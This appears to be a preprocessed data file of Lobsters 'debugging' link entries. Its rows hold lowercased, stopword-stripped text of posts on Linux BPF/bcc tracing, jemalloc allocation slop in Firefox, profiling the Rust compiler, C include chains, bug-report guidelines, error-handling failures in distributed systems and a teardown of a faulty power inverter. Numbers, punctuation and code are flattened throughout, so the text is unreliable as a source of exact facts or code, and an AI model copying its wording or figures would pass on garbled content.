sudo pamstart sudo root login pamstart login bgregg many tool usage message h man page text file example output bcc project necessity linux tracing kernel summary feature ftrace perfevents outside still dumpandpostprocess data decade old technique high overhead scale could nt frequency count process name function name stack trace arbitrary data kernel could nt save variable one probe event retrieve another meant could nt measure latency time delta custom place could nt create inkernel latency histogram could nt trace usdt probe could nt even write custom program dtrace could solaris bsd linux outoftree tracer like systemtap could serve need brought challenge sake completeness yes could write kprobebased kernel module practically one joined netflix cloud performance team spent year dtrace expert might seemed crazy move linux motivation particular seeking greater challenge performance tuning netflix cloud rapid application change microservice architecture distributed system sometimes job involves system tracing previously used dtrace without dtrace linux began using built linux kernel ftrace perfevents made toolkit tracing tool perftools invaluable could nt task particularly latency histogram stack trace counting needed kernel tracing programmatic happened bpf add programmatic capability existing kernel tracing facility tracepoints kprobes uprobes enhanced rapidly linux series timed sampling final major piece landed linux patchset many thanks alexei starovoitov working bpf facebook lead developer behind bpf enhancement linux kernel following feature built added dynamic tracing kernellevel bpf support kprobes dynamic tracing userlevel bpf support uprobes static tracing kernellevel bpf support tracepoints timed sampling event bpf perfeventopen pmc event bpf perfeventopen filtering via bpf program debug output bpftraceprintk perevent output bpfperfeventoutput basic variable global perthread variable via bpf map associative array via bpf map frequency counting via bpf map histogram linear custom via bpf map timestamps time delta bpfktimegetns bpf program stack trace kernel bpf stackmap stack trace user bpf stackmap overwrite ring buffer perfeventattrwritebackward frontend using bcc provides python lua interface bcc add static tracing userlevel usdt probe via uprobes debug output python bpftracepipe bpftracefields perevent output bpfperfoutput macro bpfopenperfbuffer interval output bpfgettable tableclear histogram printing c struct navigation kernellevel bcc rewriter map bpfproberead symbol resolution kernellevel ksym ksymaddr symbol resolution userlevel usymaddr bpf tracepoint support via tracepointprobe bpf stack trace support incl walk method stack frame various helper macro function example example many tool tool tutorial docstutorial md reference guide docsreferenceguidemd holding post last major feature integrated still minor missing thing workarounds additional thing might right worth celebrating linux advanced tracing capability built safety bpf enhancement designed production safe used today large scale production environment determined may able still find way hang kernel experience exception rather rule bug fixed fast especially since bpf part linux eye linux hit couple nonbpf bug development needed fixed rcu reentrant could cause kernel hang funccount fixed bpf map prealloc patchset workaround bcc older kernel uprobe memory accounting issue failed uprobe allocation fixed uprobes fix memcg accounting patch backported earlier kernel eg current linux tracing take long prior work split among several tracer never consolidated effort single one issue see tracing summit talk one thing nt note counter effect partial solution company found another tracer systemtap lttng sufficient specific need happy hear bpf contributing development nt priority given existing solution bpf enhanced tracing last two year process could gone faster early zero fulltime engineer working bpf tracing alexei starovoitov bpf lead brenden blanco bcc lead others priority tracked hour netflix voluntarily spent around time bpfbcc nt much priority part workarounds including perftools work older kernel bpf tracing arrived already tech company lookout bpf skill still highly recommend netflix trying hire bpf skill still happy netflix ease use might appear largest remaining difference dtrace bccbpf ease use depends bpf tracing either using bpf toolsmetrics difference tool behave gui access similar metric people use bpf way developing toolsmetrics bcc right much harder dtrace concise language similar awk whereas bcc us existing language c python lua library bcc tool cpython may lot code donly tool line however many dtrace tool used shell wrapping provide argument error checking inflating code much bigger size coding difficulty also different rewriter bcc get fiddly make script much complicated develop extra bpfproberead requiring knowledge bpf internals situation improve time improvement planned running common oneliners fairly similar dtrace could many dtrace command whereas bcc variety multitools trace argdist funccount funclatency etc writing custom ad hoc oneliners dtrace trivial accelerated advanced analysis allowing rapid custom question posed answered system bcc currently limited multitools scope short end user bpf tool nt notice difference advanced user tool developer like bcc lot difficult right show current example bcc python frontend code tracing disk io printing io size histogram bcc import bpf time import sleep load bpf program b bpf text include uapilinuxptraceh include linuxblkdevh bpfhistogram dist int kprobeblkaccountiocompletion struct ptregs ctx struct request req distincrement req datalen return header print tracing hit ctrlc end trace ctrlc try sleep except keyboardinterrupt print output b dist kbytes note embedded c text python code get job done also room improvement fortunately time take many month people linux use bpf time create tool frontends higherlevel language easier frontend higherlevel language may improve adoption much might imagine people use canned tool gui u actually write opposed higherlevel language either already exist like systemtap usrbinstap opensnoopstp trace file open basic version opensnoop probe begin printf n sn uid pid comm path probe syscallopen printf sn uid pid execname filename would nt nice could systemtap frontend language integration tapsets highperformance kernel built bpf backend richard henderson red hat already begun work released initial version also ply entirely new higherlevel language bpf usrbinenv ply kprobe sys syscalls func count also promising although think real challenge tool developer wo nt language knowing new superpower contribute promotion currently marketing effort bpf tracing company know using facebook netflix github take year become widely known help sharing article resource others industry education write article give meetup talk contribute bcc documentation share case study bpf solved real issue provided value company fix bcc issue see bcc issue list includes bug feature request file bug use bccbpf file bug find new tool observability tool develop please nt hasty people going spend hour learning using tool make intuitive excellent possible see doc mike muuss said ping program known would famous accomplishment life might worked another day two added option highlevel language existing bcc frontend language really bother maybe come something much better build bcc leverage libbcc could help systemtap bpf ply effort gui integration apart bcc cli observability tool new information visualized latency heat map flame graph tracer systemtap ktap sysdig lttng etc possible future either using bpf becoming better specifically explaining blog post dtrace still using netflix freebsdbased cdn bccbpf reading written bccbpf tool enduser tutorial bcc python developer tutorial bccbpf reference guide contributed useful tool exampletxt file man page prior post bcc bpf include also giving talk bccbpf facebook performance scale event linux bpf superpower december giving tutorial talk bpfbcc usenix lisa boston update also new website linux ebpf tool acknowledgement van jacobson steve mccanne created original bpf packet filter barton p miller jeffrey k hollingsworth jon cargille inventing dynamic tracing publishing paper dynamic program instrumentation scalable performance tool scalable highperformance conputing conference shpcc knoxville tennessee may kerninst paradyn uwmadison early dynamic tracing tool showed value dynamic tracing late mathieu desnoyers lttng lead developer kernel marker led tracepoints ibm developed kprobes part dprobes dprobes combined ltt provide linux dynamic tracing nt integrated bryan cantrill mike shapiro adam leventhal sun microsystems core developer dtrace awesome tool proved dynamic tracing could production safe easy use given mechanic dynamic tracing crucial turning point technology became safe enough shipped default solaris o known reliability many sun microsystems staff marketing sale training role promoting dtrace creating awareness desire advanced system tracing roland mcgrath red hat lead developer utrace became uprobes alexei starovoitov plumgrid facebook lead developer enhanced bpf programmatic kernel component necessary many linux kernel engineer contributed feedback code testing patchsets development enhanced bpf search lkml bpf wang nan daniel borkmann david miller peter zijlstra many others brenden blanco plumgrid lead developer bcc sasha goldshtein sela developed tracepoint support bcc developed powerful bcc multitools trace argdist contributed usdt support vicent martí others github engineering developing lua frontend bcc contributing part usdt allan mcaleavy mark drayton bcc contributor various improvement thanks netflix providing environment support able contribute bpf bcc tracing help get done also contributed tracing general year developing tracing tool using tnfprex dtrace systemtap ktap ftrace perf bccbpf book blog talk finally thanks editing another post conclusion linux nt dtrace language way dtracetoolkit tool linux kernel final capability needed support modern tracing via enhancments builtin bpf engine hardest part done kernel support future work includes performance cli tool alternate higherlevel language gui customer performance analysis product also good news ask latency histogram heatmaps cpu offcpu flame graph better latency breakdown lowercost instrumentation perpacket tracing processing user space old inefficient way going upgrade linux officially released new performance tool await aptget install bcctools update bccbpf tool see bcc github ebpf tool page enjoy brendan
512,Lobsters,debugging,Debugging,A New Impossible Coin,https://www.youtube.com/watch?v=iPILIf7ru48,new impossible coin,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature new impossible coin youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature new impossible coin youtube
513,Lobsters,debugging,Debugging,Beautiful Racket: Continuations,http://beautifulracket.com/explainer/continuations.html,beautiful racket continuation,,
514,Lobsters,debugging,Debugging,Clownshoes available in sizes 2^10+1 and up! (2011),https://blog.mozilla.org/nnethercote/2011/08/05/clownshoes-available-in-sizes-2101-and-up/,clownshoes available size,add new reporter uninstrumented part gecko concordance using valgrind print stack trace fixed bug arena allocator patch identified problem identified illdocumented hack working fix converting existing reporter use mallocusablesize master plan,working lot memory lately really useful tool one frustrating thing decent chunk memory usage covered existing memory reporter falling heapunclassified bucket bucket typically account memory explicit measurement discussed dark matter several time memshrink meeting lot work underway add new reporter uninstrumented part gecko seen case look like decent chunk missing memory due j engine already seemingly thoroughly instrumented week realized dark matter could due slop jemalloc browser heap allocator slop ask heap allocator certain number byte often give back asked rounding size waste memory good reason make heap allocator much faster simpler help avoid fragmentation memory freed following comment jemallocc show jemalloc size class request one listed size rounded nearest size category subcategory size small tiny quantumspaced subpage kb kb large kb kb kb kb kb kb huge mb mb mb extreme case jemalloc return almost double asked example ask byte give lot time live slop need heapallocate object byte jemalloc give byte accept byte waste flexibility request size good idea pick size poweroftwo always give zero slop remember important later instrumented jemalloc print entry every heap allocation showing requested amount actual allocated amount resulting slop started firefox opened gmail shut firefox next ran resulting log wonderful little concordancelike script called count analyzes file tell many time distinct line occurs top ten line output number small small small small small small large small small small line mean allocation print information free common line small occurred time accounting line file small refers jemalloc class size category see every allocation request byte rounded byte resulting byte slop looking list saw case byte requested jemalloc returned byte huge waste also smelled fishy inspection lot smaller still suspicious case number slightly larger poweroftwo rounded next poweroftwo etc investigated number adding code jemalloc detect suspicious request size using valgrind print stack trace every time one occurred found four distinct place codebase code question flexibility amount memory allocated tried ask poweroftwo botched request thus ended asking slightly poweroftwo jssrcvmstringcpp concatenating two string capacity resultant string rounded next poweroftwo unless string really big case rounding le aggressive reasonable thing mean concatenation occurs good chance space extra char added inline avoiding extra allocation copy code first poweroftwo roundup added sizeof jschar two byte size allow space terminating null char code responsible byte request mentioned earlier luke wagner fixed bug minimal change earlier week unable easily measure overall cost avoiding slop frequency good thing nsprpublibdsplarenac implement arena allocator arena pool given size arena created size passed almost always poweroftwo good except allocator add byte onto request arena header hold bookkeeping information start firefox load gmail box see approximately space wasted bug fix simple requires arena payload reduced size header patch awaiting review sadly enough problem identified year ago fixed jssrcjsarenacpp almost identical nsprpublibdsplarenac story problem first identified year ago fixed patch awaiting review make much difference practice problem separately identified particular jsarenapool allocates memory worked around using illdocumented hack best one sqlite careful measuring memory usage provides api access measurement order measure memory usage accurately add byte every allocation request order store requested size start resulting heap block convert lot byte request byte request ironically enough slop caused storing requested size rendered stored size inaccurate determined result sqlite using roughly memory firefox think go look storagesqlite number memory mentally adjust accordingly mac laptop old profile tab open currently probably additional slop sqlite upstream product author working fix fix landed two benefit first firefox memory usage go good everyone second proportion dark matter memory also drop make memory profiling accurate useful converting existing reporter use mallocusablesize account much legitimate slop reducing amount dark matter master plan identifying whatever left post title andreas gal us term clownshoes refer code laughably bad found filed first bug fit whimsy put clownshoes whiteboard later realize suitable clown shoe botched poweroftwosized allocation lot empty space thus make owner le nimble could perfect
515,Lobsters,debugging,Debugging,Include Detective: Keep An Eye On Those Includes,https://metricpanda.com/rival-fortress-update-38-include-detective-keep-an-eye-on-those-includes,include detective keep eye includes,github include detective work gcc man page useful speed compile time single translation unit build precompiled header word caution simple example,note find source code include detective githubthis weekend wrote little bash script investigate include chain system header turned pretty useful talk postthis include detective look like action work include detective bash script run compiler dummy c c file include directive include point path system header specified argument scriptthe compiler gcc clang family compiler invoked twice flag e dmthe e flag stop compilation preprocessing stage resulting output header inlined preprocessor directive macro expandedthe dm flag tell compiler dump preprocessor defines builtin one defined included file output parsed statistic printed see abovethe source preprocessed file dumped passing p print filename following output running includedetective p asserth stdin builtin commandline commandline usrincludestdcpredefh commandline stdin usrincludeasserth usrincludeasserth usrincludefeaturesh usrincludefeaturesh usrincludesyscdefsh usrincludesyscdefsh usrincludebitswordsizeh usrincludesyscdefsh usrincludefeaturesh usrincludefeaturesh usrincludegnustubsh usrincludegnustubsh usrincludegnustubsh usrincludefeaturesh usrincludeasserth usrincludeasserth usrincludeasserth extern void assertfail const char assertion const char file unsigned int line const char function attribute nothrow leaf attribute noreturn extern void assertperrorfail int errnum const char file unsigned int line const char function attribute nothrow leaf attribute noreturn extern void assert const char assertion const char file int line attribute nothrow leaf attribute noreturn stdin line beginning special directive compiler insert debug purpose read gcc man pagewhy useful include detective useful looking eliminate header order speed compile time using single translation unit build favor precompiled headerssome header fine end using symbol defineother header much maybe huge need prototype couple function maybe recursively include many header unnecessarily slowing compile timesin case like may worth effort create minimal header contains declaration care abouta word caution removing header replacing slimmedout version requires make sure function prototype preprocessor defines correct architecture shipping toa simple example simple example would go eliminating header dependency slim version using classic world using plain c c c include iostream int main std cout hello world std endl see c program get expanded line code included file process done every time compile quite crazy need small subset declared header c include stdioh int main printf hello world n c equivalent much saner line code includes still calling function really need noise coding plain c process easy run include detective header interested removing grep function defines need includedetective p stdioh grep printf used p flag meaning preprocessed header prited stdout next pipe result grep searching printf using option tell grep want one line context match know function declaration header span two three linesthis relevant output extern int printf const char restrict format copy paste line source file like extern int printf const char restrict format int main printf hello world n include stdioh compile fineobviously getting rid standard library linker still link preprocessor stage compilation faster simple case speed increase irrelevant number includes grows see much larger c example quite nightmare imagine fact include iostream brings line codei recommend manually figure smart way automate follow process output preprocessed header p option using modecxx tell include detective working c like modec includedetective p iostream iostreamdumpccusing iostreamdumpcc reconstruct chain classtemplatetypedef make cout endl possible copy minimal include headerthe resulting header oneliner like c case certainly line code
516,Lobsters,debugging,Debugging,Managing good bug reports,https://anarc.at/blog/2016-10-14-bug-reporting/,managing good bug report,prior art report bug effectively ask question smart way sgtatham esr research reportingbugs esr sgtatham tail bug reporting guideline monkeysign project bug reporting guide writing standard point place nt way reproducing incomplete good bug report takeaway sgtatham esr verbose issue tracker bugseverywhere stackexchange reproducing environment joeyh suggestion idea brought forward borg project small library improved issue template bug reporting guideline issue template issue creation form limitation gitlab gitlab github issue guideline sgtatham online issue tracker debian bts monkeysign issue template report bug effectively sgtatham esr sgtatham prose literacy edited,bug reporting art form often neglected software project bug report allow contributor participate without deep technical knowledge time provide crucial space developer made aware issue software could foreseen found lack resource variety imagination prior art unfortunately rarely good guideline submitting bug report historically people pointed towards report bug effectively ask question smart way guide useful motivated people may seem attractive reference project manager suffer serious issue written technical people nontechnical people result deeply condescending attitude calling people stupid various animal name like mongoose also technical one start copyright notice changelog us magic word like core dump id long sgtatham word long esr even longer word text take minute read average reader according research individual project guide well linux reportingbugs file much shorter read minute provided understand topic hand interestingly guide refers esr sgtatham guideline mean degenerate case user nt privilege reading esr prose already extra hour half reading honestly followed guideline reporting bug often find good documentation tail project bug reporting guideline easily accessible quick read although still might technical could argued need get technical point get information course monkeysign project started bug reporting guide nt yet address issue considering writing new guide figured would look people work get feedback writing standard point document written people really expected read seeking help seems unlikely someone would motivated enough something broken part computer figure something read fifteen thousand word novel report bug finally write bug report warranty support attached would paying customer would nt want forced waste time reading prose either job help fix broken thing reverse someone consulting day totally understand user u developer problem socialized computer make u weird obtuse excuse need clean act furthermore surprising often get make bug report difficult use monkeysign project technical expected bug report would get would well written way reproduce happened received bug report place nt way reproducing simply incomplete three bug report filed people know technically capable one fellow debian developer second filed good bug report day third one contributor sent good patch three case knew three people probably read guideline mentioned past may even read monkeysign bug reporting guideline well explain bug report lack time people thought issue obvious would get fixed rapidly obviously something broken need better way takeaway guide trying tell u ask question right place search similar question issue reporting bug try make developer reproduce issue failing try describe issue well write clearly specific verbose yet concise obviously contradiction like sgtatham telling u verbose esr tell u basically verbose definitely tension many many detail great bug report done properly tend towards side terseness description people know concise people nt likely learn reading word novel nt manage parsimonious willing allow verbosity bug report prefer many detail instead missing key bit information issue tracker step job send people right place give right tool monkeysign used manage bug bugseverywhere turned terrible idea understand git bugseverywhere file bug report result exactly zero bug report filed nondevelopers whole time used although bug filed debian bugtracker good bug tracker mailing list email address good bug tracker lose track old issue hard newcomer search archive advantage unified interface support forum bug tracking however redmine gitlab github others decentenough bug tracker key point issue tracker publicly available user able register easily file new issue also able massedit ticket user able discover tracker feature easily sorry say debian bts somewhat fall short two feature step shared responsibility easy way search issue help user looking similar issue stackexchange site excellent job automatically searching similar question write question suggesting similar one attempt weed duplicate duplicate still happen clearly marked linked distinct mechanism bug tracker offer high level functionality feel fault lie end user end reproducing environment step le user responsibility detail documentation clearly share environment reproduced bug example end user decides want share information monkeysign finally implemented joeyh suggestion shipping test suite program tell people run test suite environment see regression specific environment known bug way novel bug look writing new unit test also include way information environment version output idea brought forward borg project ease debugging way people send output monkeysign test monkeysign version good overview happening end course monkeysign also support usual verbose debug flag user enable reproducing issue another idea report bug directly application seen firefox software automatic bug reporting tool somehow seem unsatisfactory user feedback report go followed useful larger project get statistical data useful user short term monkeysign try handle exception code graceful way could better use small library handle exception library since improved directly file bug github project assumes user logged github nice prepopulate bug report relevant information front issue template meantime make sure people provide enough information moved lot bug reporting guideline separate issue template issue template available issue creation form although enabled default weird limitation gitlab issue template available gitlab github issue template somewhat force user straight jacket already something structure bug report could distinct form element filled like flexibility template possibility user escape formalism plead help way issue guideline end opted short paragraph style tail documentation including reference sgtatham optional future reference report new bug review existing issue online issue tracker debian bts monkeysign make sure bug already reported elsewhere first aim bug report tell developer exactly reproduce failure try reproduce issue describe possible try describe went wrong detail write error message especially number take necessary time write clearly precisely say mean make sure misinterpreted include output monkeysign test monkeysign version monkeysign debug bug report see issue template detail include bug report wish read issue regarding communication bug report read report bug effectively take around minute unfortunately short rewriting sgtatham guide feel much general guide find esr guide verbose commanding sgtatham prose literacy end fundamental issue reporting bug assumes user literate capable writing amazing prose enjoy reading last jk rowling novel kind thing unreasonable expectation user nt even speak language let alone read write make challenging collaboration say least automated reporting make sense nt require user intervention communication mediated machine without human intervention pesky culture maintainer liberal accept conservative send tolerant help user fixing issue end fail way attempt improve situation bug reporting guide seem written short story taken hopefully pleasant minute time minimum hopefully succeeded clear specific verbose concise look forward feedback improve bug reporting culture created au milieu de la matinée de friday october edited tard friday en soirée june
517,Lobsters,debugging,Debugging,How to speed up the Rust compiler,https://blog.mozilla.org/nnethercote/2016/10/14/how-to-speed-up-the-rust-compiler/,speed rust compiler,rust use extensively quite slow getting code main rust repository building rust compiler update update incremental compilation basic profiling serious profiling tell exactly malloc call coming rustfiltsh update finding suitable benchmark rustcbenchmarks perfrustlangorg wrote script readme win future work issue update caveat lector,rust great language mozilla plan use extensively firefox however rust compiler rustc quite slow compile time pain point many rust user recently working improving post cover done interest anybody else want help speed rust compiler although done work linux mostly applicable platform well getting code first step get rustc code first fork main rust repository github make two local clone base clone modify serf stable comparison point second clone make modification use command something like usernnethercote r cd moz git clone http githubcom userrust r cd r git remote add upstream http githubcomrustlangrust git remote seturl origin git githubcom userrust done building rust compiler within two repository first configure configure enableoptimize enabledebuginfo configure optimization enabled match release version rustc configure debug info enabled get good information profilers update add build llvm backend debug info build rustflags make update previously rustflags speed compile time lars bergstrom informed slow resulting program significantly measured right resulting rustc slower stopped using full build following downloads compiler used build local compiler build llvm become part local compiler build compiler compiler build compiler compiler mindbending grok stage especially regard library work one notable example compiler us system allocator compiler us jemalloc found compiler similar performance therefore mostly measure compiler much faster build compiler following command rustflags make building compiler take surprising surprising rebuilding compiler small change also take lot code get recompiled change two reason rust unit compilation crate crate consist multiple file modify crate whole crate must rebuilt surprising rustc dependency checking coarse modify crate every crate depends also rebuilt matter trivial modification surprised greatly example modification parser crate called libsyntax cause multiple crate recompiled process take minute fast desktop machine almost change compiler result rebuild take least minute incremental compilation greatly improve dependency situation still experimental state tried yet run test full build ulimit c make check checking abort ulimit test produce lot core file want swamp disk build system complex lot option command give nice overview common invocation make tip basic profiling next step basic profiling like careful rustc invoking time especially systemwide version installed avoid relying path instead define environment variable like export export export export example follow use version rustc invoke rustc ability produce basic stats time memory used compiler pas enabled ztimepasses flag invoking rustc directly like ztimepasses ar building cargo instead rustc cargo rustc ztimepasses rustc part tell cargo want use nondefault rustc part flag passed rustc build final crate bit weird useful sample output ztimepasses time r parsing time r recursion limit time r crate injection time r plugin loading time r plugin registration time r expansion time r maybe building test harness time r maybe creating macro crate time r checking inline asm case target nt support time r complete gated feature checking time r early lint check time r ast validation time r name resolution time r lowering ast hir time r indexing hir time r attribute checking time r language item collection time r lifetime resolution time r looking entry point time r looking plugin registrar time r region resolution time r loop checking time r static item recursion checking time r computeincrementalhashesmap time r loaddepgraph time r type collecting time r variance inference time r coherence checking time r wf checking time r itemtypes checking time r itembodies checking time r dropimpl checking time r const checking time r privacy checking time r stability index time r intrinsic checking time r effect checking time r match checking time r liveness checking time r rvalue checking time r mir dump time r simplifycfg time r qualifyandpromoteconstants time r typeckmir time r simplifybranches time r simplifycfg time r mir pass time r borrow checking time r reachability checking time r death checking time r stability checking time r unused lib feature checking time r lint checking time r resolving dependency format time r nolandingpads time r simplifycfg time r eraseregions time r addcallguards time r elaboratedrops time r nolandingpads time r simplifycfg time r instcombine time r deaggregator time r copypropagation time r addcallguards time r pretrans time r prepare mir codegen pass time r write metadata time r translation item collection time r codegen unit partitioning time r internalize symbol time r translation time r assert dep graph time r serialize dep graph time r llvm function pass time r llvm module pass time r codegen pass time r codegen pass time r llvm pass time r serialize work product time r linking far tell indented pass subpasses parent pas first nonindented pas afterwards serious profiling ztimepasses flag give good overview really need profiling tool give finergrained information get far done profiling two valgrind tool cachegrind dhat invoke cachegrind like valgrind toolcachegrind cachesimno branchsimyes cachegrindoutfile outfile outfile specifies output filename find instruction count measured cachegrind highly useful branch simulation result occasionally useful cache simulation result almost never useful cachegrind output look like ir program total ir file function intmalloc tdeflcompress intfree serialize malloc memcpyavxunaligned serialize opaque decoder serialize serialize decoder readusize free rustcback processblock llvm selectiondag combine llvm combinelevel llvm aaresults llvm codegenopt level rustcincremental calculatesvh hasher ichhasher core hash hasher write rustc ty subst substs tcx core hash hash hash llvm selectiondagisel selectcodecommon llvm sdnode unsigned char const unsigned int ir short icache read corresponds number instruction executed cachegrind also give linebyline annotation source code cachegrind result indicate malloc free usually two hottest function compiler also use dhat malloc profiler tell exactly malloc call coming invoke dhat like toolexpdhat sortbytotblocksallocd outfile sometimes also use sortbytotbytesallocd dhat output look like maxlive block totalloc block avg size death avg age prog lifetime accratios rd wr bread bwritten malloc syntax ptr p serialize serialize decodable decode core iter map f core iter iterator iterator next rustcmetadata decoder impl rustcmetadata cstore cratemetadata getattributes maxlive block totalloc block avg size death avg age prog lifetime accratios rd wr bread bwritten malloc syntax ptr p core clone clone clone syntax ext tt macroparser parse syntax tokenstream tokentree parse death value indicate total number call malloc call stack usually metric interest accratios value also interesting especially rd value indicates allocated block never read see example problem found way profilers also pipe outfile eddyb rustfiltsh script demangles ugly rust symbol like lt serialize opaque decoder lt gt serialize serialize decoder gt readusize something much nicer like serialize opaque decoder serialize serialize decoder readusize update native support rust demangling recently landed valgrind repo use trunk version valgrind longer need use rustfiltsh combination valgrind program use cargo sometimes useful know exact rustc invocation cargo us find either command rustc cargo build v rustc cargo rust v also done decent amount ad hoc println profiling insert println call hot part code use script postprocess useful want know exactly many time particular code path hit also tried perf work never established much rapport ymmv general profiler work c c code also work rust code finding suitable benchmark know going profile need good workload could use compiler big complicated reasoning various stage confusing avoided instead focused entirely rustcbenchmarks preexisting rustc benchmark suite contains benchmark various size used track rustc performance perfrustlangorg time easy use locally wrote script purpose invoke something like comparepy compare two given compiler debug build benchmark see next section example output want run subset benchmark specify additional argument benchmark rustcbenchmarks makefile three target see readme detail target helpful win result compare following two version rustc comparepy commit first commit september commit october futuresrstest v faster variance helloworld v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance v faster variance improvement due change managed nice win including following arena allocator called typedarena rustc creates many mostly shortlived creation arena would allocate byte chunk preparation first arena allocation request dhat output showed vast majority arena never received request made typedarena lazy first chunk allocated necessary reduced number call malloc greatly sped compilation several rustcbenchmarks one similar rust hashmap implementation lazy allocate memory element first one inserted good thing surprisingly common large program create hashmaps never used however rust hashset implementation layer top hashmap property guess rustc also creates large number hashsets never used dhat output made obvious fixed sped compilation several rustcbenchmarks even better change rust stdlib rather rustc speed program creates hashsets without using one involved avoiding useless data structure manipulation particular table empty dhat pointed table created never read clue needed identify improvement sped two benchmark couple others one changed hot function serialization code return cow str instead string avoided lot allocation future work profile indicate following part compiler account lot runtime malloc free still two hottest function benchmark avoiding heap allocation win compression used crate metadata llvm bitcode show profile function called tdeflcompress issue open hash table operation hot lot come interning various value type checking see ctxtinterners type detail crate metadata decoding also costly llvm execution big chunk especially optimized build far treated llvm black box tried change least partly know build debug info necessary get source file line number profile update new configure option cause llvm build debug info lot program broadly similar profile occasionally get odd one stress different part compiler example rustcbenchmarks dominated operation involving delighfully named obligationsforest see dominated think macro processing worth profiling compiler new codebases caveat lector still newcomer rust development although lot help rustc irc channel big thanks eddyb simulacrum particular may thing wrong suboptimally nonetheless hope useful starting point newcomer want speed rust compiler
518,Lobsters,debugging,Debugging,Simple testing can prevent most critical failures,https://blog.acolyer.org/2016/10/06/simple-testing-can-prevent-most-critical-failures/,simple testing prevent critical failure,simple testing prevent critical failure analysis production failure distributed dataintensive system problematic basic block error handling code triggered failure guaranteed exposed general finding failure mostly easy reproduce information need probably log,simple testing prevent critical failure analysis production failure distributed dataintensive system yuan et al osdi yesterday paper needed something little easier digest today simple testing prevent critical failure certainly hit spot thanks caitie mccaffrey first heard author studied randomly sampled userreported failure five dataintensive distributed system cassandra hbase hdfs mapreduce redis system designed tolerate component failure widely used production environment failure considered carefully studied failure report discussion user developer log code manually reproduced failure better understand specific manifestation occurred lot really interesting finding immediately applicable advice paper best discovery catastrophic failure impacting user shutting whole system etc simpler root cause tends fact almost catastrophic failure total result incorrect handling nonfatal error explicitly signalled software third failure brought entire production system remember caused trivial mistake error handling could detected simple code inspection without even requiring specific knowledge system three thing want check error handler ignore error contain log statement example led data loss hbase error handler todo fixme comment example took production cluster error handler catch abstract exception type eg exception throwable java take drastic action aborting system example brought whole hdfs cluster three scenario author built static checking tool called aspirator used check real world system including study aspirator used captured bug fixed cassandra hbase hdfs mapreduce catastrophic failure studied could prevented using aspirator check system shown table found new bug bad practice along falsepositives reported bug back developer time paper published confirmed fixed developer another catastrophic failure caused incorrect error handling require systemsspecific knowledge detect lot significant proportion catastrophic failure mistake error handling system specific still easily detectable formally incorrect error handling case would exposed statement coverage testing error handling problematic basic block error handling code triggered failure guaranteed exposed final catastrophic failure indeed involve complex bug error handling logic much harder systematically root hey getting rid potentially catastropheinducing bug pretty good start general finding failure mostly easy reproduce majority production failure reproduced unit test need live system reproduce failure almost certainly get away threenode system almost failure guaranteed manifest node manifest necessary large cluster test reproduce failure furthermore failure require three input event get manifest deterministic guaranteed happen given right input event sequence information need probably log right next needle majority failure triggering event logged suggests possible deterministically replay majority failure based existing log message alone log noisy though median number log message printed failure minimal configuration minimal workload sufficient reproduce failure
520,Lobsters,debugging,Debugging,The Power Jack 3500 Watt inverter - buyers beware!,http://ludens.cl/Electron/chinverter/chinverter.html,power jack watt inverter buyer beware,power jack watt inverter buyer beware bad really lack current sensing dcdc converter unstable control loop flux walking inadequate filter choke optoisolator drift unsafe feedback lack overvoltage protection nonsensical output filter arrangement risk death electrocution phase lack emi filtering charger instability charger control loop poor design thermal attachment power component first lack creepage distance wrong component choice recovery attempt slow fast charger dcdc converter filter choke dcdc converter loop compensation design mistake showing air flow grounding bypassing weak auxiliary power supply homo ludens electronicus,power jack watt inverter buyer beware late needed buy high power true sine wave inverter alternative energy scheme scared away poor quality seen many time asked repair chinese inverter willing pay outrageous price asked manufacturer known quality product settled taiwanese made inverter power jack rated output input several hundred ampere course continuous output surge capability true sine wave output addition builtin charger necessary detection switchover circuitry make work ups desired price seemed right power jack made lot advertising telling product much better typical chinese one bought bought inverter got cheated real good often said one get one pay paid good real decent money inverter got piece crap excuse expression needed complete reengineering reconstruction become usable suffered loss least web page get satisfaction trying help others fall trap power jack inverter arrived read instruction leaflet brief show hook three function standalone inverter standalone charger ups intended use standalone inverter hooked using heavy wire battery connection surge take almost ampere battery bank switched measured output voltage waveform etc voltage fine waveform bit strange one half cycle sine wave clean volt high frequency noise riding also inverter produced impressive amount radio interference even nothing connected output much completely erased radio reception input current consumption le ampere seemed fine current pulsed short high current pulse followed pause averaging le called hiccup mode thought design nt worry load test connecting heater inverter second battery nt good nt want tax much output voltage dropped little much seemed fine really strange thing led power meter inverter stayed fixed watt regardless much power really consumed ended testing wrote seller told normal power meter show exact word oh well nt need power meter since inverter arrived well working gave seller positive feedback ebay day later wired whole system large good battery alternative energy system charging battery regulated inverter connected feed house little consumption moment watt inverter happily idled along taking woodworking went get tool include circular saw planer everything set switched workbench light start working nothing happened strange went back inverter found room full white smoke awful smell inverter giving zero output still led telling fine green inv led lit power meter bargraph showing normal watt battery voltage meter output lot smoke nice shiny new power jack inverter commited suicide running almost load whithin first two hour operation first contacted seller telling happened since took time reply meantime opened inverter look damage shell come apart two half bottom half shown upper place contains power component pushpull dcdc converter step consists six converter group transformer two pair mosfets assorted driving bypassing snubbering component secondary transformer connected series two group three group bridge rectifier lc filter output two group connected series voltage balancing employed current sensor whatsoever big board call mainboard carry sine wave chopper us igbt bridge lc output filter two big inductor also charger circuit switchover system plugin control board control dcdc converter switchover charger drive chopper immediately noticed two popped electrolytic capacitor one see photo capacitor capacitor across high voltage dc bus sine wave chopper board take full high frequency ripple current easily several ampere ripple current rating capacitor one ampere reason popping open one filter capacitor used one two seriesconnected rectifierfilter group produce high voltage dc companion still fine seemed point looked like big overvoltage happened lasting good electrolytic cap nt pop short overload one connector linking high voltage dc converter board main board spill capacitor juice looked closely started finding horrible thing example screw came loose shipping got caught place caught least nt cause short circuit screw coming loose inside equipment bad thing spacer came loose screw fell spacer got stuck white thermal grease stayed put hmm thermal grease silicone rubber pad power component heatsink make thermal grease unnecessary one would think picking spacer looking closely became clear pressure bar holding part heatsink installed much low pressing lower edge part result lower area get buried soft rubber top part stick free air thermal contact whatsoever instead fixing problem power jack engineer chose smear thermal grease flange least smeared grease void might worked least little bit smearing grease part rubber pad totally useless yet another photo showing people tried solve problem lousy thermal contact trace grease part rubber air grease outside void complete troubleshooting found mosfets burned source open drain shorted gate fuse fine thank along mosfets gate resistor also failed two popped electrolytic cap also two overvoltage protector diode transil failed short circuit side capacitor still fine since expensive ship inverter back taiwan repair chile whole importexport would real hassle avoid paying import tax second time proposed power jack simply sent required spare 